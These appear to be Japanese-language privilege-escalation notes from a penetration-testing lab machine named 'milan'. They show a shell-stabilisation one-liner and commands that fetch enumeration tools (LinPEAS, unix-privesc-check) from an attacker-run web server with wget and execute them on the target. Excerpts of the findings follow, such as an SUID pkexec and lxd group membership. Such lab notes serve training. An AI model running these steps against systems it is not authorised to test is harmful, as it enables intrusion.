# シェルの安定化

※penelopeでシェル獲得できた場合は不要
```zsh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Ctrl + Z
stty raw -echo; fg
```

---

# Auto 

- *curl は実行できない* (`budybox curl` でも不可)
- port 8888へは接続できない

## unix-privesc-check -> 失敗
### 転送・実行

```zsh
# Attacker
cp /usr/bin/unix-privesc-check .
python -m http.server 443
```
```zsh
# Target
wget 192.168.45.215:443/unix-privesc-check 
chmod +x unix-privesc-check
./unix-privesc-check standard > unix-privesc-check.out
```

### 実行結果抽出

```sh
www-data@milan:/tmp$ cat unix-privesc-check.out 
Assuming the OS is: linux
ERROR: Dependend program 'strings' is mising.  Can't run.  Sorry!
```

---

## LinPEAS

### 転送・実行

```zsh
# Attacker
cp /usr/share/peass/linpeas/linpeas.sh .
python -m http.server 443
```
```zsh
# Target
wget 192.168.45.215:443/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.out
```

### 実行結果抽出

```sh
╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                      
══╣ Cron jobs list     
...
-rw-r-----   1 root root   859 Nov 18  2022 froxlor

# mysql がローカルで動作
# ssh も動作
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                
══╣ Active Ports (netstat)                                                                                                                                  
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -     

══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec                    
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
pkexec version 0.105

╔══════════╣ All users & groups

uid=1000(milan) gid=1000(milan04) groups=1000(milan04),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)


```

---
---

# Manual

## ユーザー


---

## システム情報


---

## 実行中のプロセス


---

## ネットワーク

- Pivot には使えない

---

## Cron


---

## インストール済みアプリケーション


---

## アクセス制限が不十分なファイル/ディレクトリ


---

## マウントされていないドライブ


---

## 高権限をもつバイナリの列挙



---

## システムデーモン



---

## 共有フォルダ、SNMP情報


---

## 興味深い情報


---

## デバイスドライバ・カーネルモジュール



